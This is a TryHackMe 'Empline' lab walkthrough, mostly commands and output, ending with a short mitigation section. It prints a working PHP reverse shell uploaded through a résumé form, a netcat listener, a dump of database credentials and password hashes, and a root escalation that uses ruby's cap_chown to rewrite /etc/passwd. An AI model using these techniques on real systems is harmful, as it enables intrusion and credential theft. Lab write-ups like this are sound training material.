# TryHackMe — Empline — Walkthrough



<img width="5001" height="444" alt="image" src="https://github.com/user-attachments/assets/72afb507-0b6b-496a-a6f2-1ede2f16aa5d" />

---


During initial browsing, the website presents as a single-page application with smooth anchor navigation; each header item jumps to a section on the same page. One exception was identified: hovering/clicking the Employment menu item reveals a link to job.empline.thm, indicating additional functionality hosted on a separate subdomain.



<img width="1418" height="870" alt="main page" src="https://github.com/user-attachments/assets/a0b85c0c-efc3-477c-a228-82f879c1e9a8" />




```bash
root@ip-10-201-9-244:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u job.empline.thm -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://job.empline.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/rss                  (Status: 301) [Size: 316] [--> http://job.empline.thm/rss/]
/xml                  (Status: 301) [Size: 316] [--> http://job.empline.thm/xml/]
/modules              (Status: 301) [Size: 320] [--> http://job.empline.thm/modules/]
/careers              (Status: 301) [Size: 320] [--> http://job.empline.thm/careers/]
/scripts              (Status: 301) [Size: 320] [--> http://job.empline.thm/scripts/]
/upload               (Status: 301) [Size: 319] [--> http://job.empline.thm/upload/]
/ajax                 (Status: 301) [Size: 317] [--> http://job.empline.thm/ajax/]
/test                 (Status: 301) [Size: 317] [--> http://job.empline.thm/test/]
/lib                  (Status: 301) [Size: 316] [--> http://job.empline.thm/lib/]
/src                  (Status: 301) [Size: 316] [--> http://job.empline.thm/src/]
/db                   (Status: 301) [Size: 315] [--> http://job.empline.thm/db/]
/js                   (Status: 301) [Size: 315] [--> http://job.empline.thm/js/]
/javascript           (Status: 301) [Size: 323] [--> http://job.empline.thm/javascript/]
/temp                 (Status: 301) [Size: 317] [--> http://job.empline.thm/temp/]
/vendor               (Status: 301) [Size: 319] [--> http://job.empline.thm/vendor/]
/images               (Status: 301) [Size: 319] [--> http://job.empline.thm/images/]
/attachments          (Status: 301) [Size: 324] [--> http://job.empline.thm/attachments/]
/ci                   (Status: 301) [Size: 315] [--> http://job.empline.thm/ci/]
/wsdl                 (Status: 301) [Size: 317] [--> http://job.empline.thm/wsdl/]
/server-status        (Status: 403) [Size: 280]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================

```
On the `/careers` page, we can browse open roles and click into a position to reach the application form. From there, the Apply view includes standard fields plus a file upload control for attaching a résumé or supporting documents, confirming the portal accepts user-supplied files during submission.


<img width="1424" height="831" alt="open cats" src="https://github.com/user-attachments/assets/f3a59011-ba3f-40e1-b356-803f28bdee17" />
Simple PHP reverse shell:

```bash
<?php
// php-rev.php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.201.9.244';  // change to your IP
$port = 4444;          // change to your listener port
$sock=fsockopen($ip,$port);
$proc = proc_open('/bin/sh', array(0=>$sock,1=>$sock,2=>$sock), $pipes);
?>
```

<img width="1414" height="861" alt="career pool" src="https://github.com/user-attachments/assets/9f692dfa-eacd-45db-833a-10a698911532" />

Set up a listener, and we recieve a shell:

````bash
root@ip-10-201-9-244:~# nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.201.34.121 33000
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-201-34-121:/var/www/opencats/upload/careerportaladd$ whoami
whoami
www-data
www-data@ip-10-201-34-121:/var/www/opencats/upload/careerportaladd$ 

````

Navigate to:

```/var/www/opencats/config.php```

```bash
/* License key. */
define('LICENSE_KEY','3163GQ-54ISGW-14E4SHD-ES9ICL-X02DTG-GYRSQ6');

/* Database configuration. */
define('DATABASE_USER', 'james');
define('DATABASE_PASS', 'ng6pUFvsGNtw');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');

/* Authentication Configuration
 * Options are sql, ldap, sql+ldap
 */
define ('AUTH_MODE', 'sql');
````

With these credentials, we are able to use mysql:

```bash
www-data@ip-10-201-34-121:/$ mysql -u james -p
mysql -u james -p
Enter password: n**********w
````


__________________________________________________________________________________________________________________________________________


````bash
MariaDB [opencats]>  select user_name, email, password, access_level from user;
< user_name, email, password, access_level from user;                        
+----------------+----------------------+----------------------------------+--------------+
| user_name      | email                | password                         | access_level |
+----------------+----------------------+----------------------------------+--------------+
| admin          | admin@testdomain.com | b67b5ecc5d8902ba59c65596e4c053ec |          500 |
| cats@rootadmin | 0                    | cantlogin                        |            0 |
| george         |                      | 86d0dfda99dbebc424eb4407947356ac |          400 |
| james          |                      | e53fbdb31890ff3bc129db0e27c473c9 |          200 |
+----------------+----------------------+----------------------------------+--------------+
4 rows in set (0.000 sec)

````
### CrackStation Result

| Algorithm | Hash                              | Plaintext           |
|----------:|-----------------------------------|---------------------|
| MD5       | 86d0dfda99dbebc424eb4407947356ac | p************sempre |


- No sudo, no crontab, no SUIDs for `george`.
- Check capabilities:
```bash
$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```
Verify user:

$ id
uid=1002(george) gid=1002(george) groups=1002(george)


Use Ruby's File.chown to take ownership of /etc/passwd:
```bash
$ /usr/local/bin/ruby -e 'File.chown(1002,1002,"/etc/passwd")'
$ ls -lah /etc/passwd
-rw-r--r-- 1 george george 1.7K Jul 20 19:48 /etc/passwd
```

Create a password hash (example using openssl):
```bash
$ openssl passwd mynewpass
# example output: bUlQOIGbhxiis
```

Edit /etc/passwd (now writable by george) and set the root password hash line:
````bash
root:bUlQOIGbhxiis:0:0:root:/root:/bin/bash
````

Switch to root:
```bash
$ su root
Password: *created password*
# now root
```

Confirm flag / root file:
```bash
# cat /root/root.txt
74*****d0556e9c6f22e6f54b*****d5
```

---
 
### Mitigation

Remove unneeded capabilities:
sudo setcap -r /usr/local/bin/ruby

Restore strict ownership & permissions for sensitive files:
sudo chown root:root /etc/passwd && sudo chmod 644 /etc/passwd

Avoid placing secrets in webroot/config files; use env vars / vaults and rotate credentials if exposed.

Harden runtime permissions: run interpreters without elevated capabilities and audit file capabilities:
sudo getcap -r / 2>/dev/null

Monitor filesystem/integrity and alert on unexpected ownership/content changes.

Commands Reference:

```
# directory enumeration
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://job.empline.thm -t 50

# example PHP webshell (change IP/PORT)
# upload via web form as resume.php or bypass naming checks

# listener
nc -nvlp 4444

# inspect config
cat /var/www/opencats/config.php

# mysql
mysql -u james -p -h localhost opencats

# dump users
SELECT user_name,email,password,access_level FROM user;

# check capabilities
getcap -r / 2>/dev/null

# use ruby to chown /etc/passwd (lab only)
sudo /usr/local/bin/ruby -e 'File.chown(1002,1002,"/etc/passwd")'

# create password hash
openssl passwd mynewpass

# become root after editing /etc/passwd (lab only)
su root

```










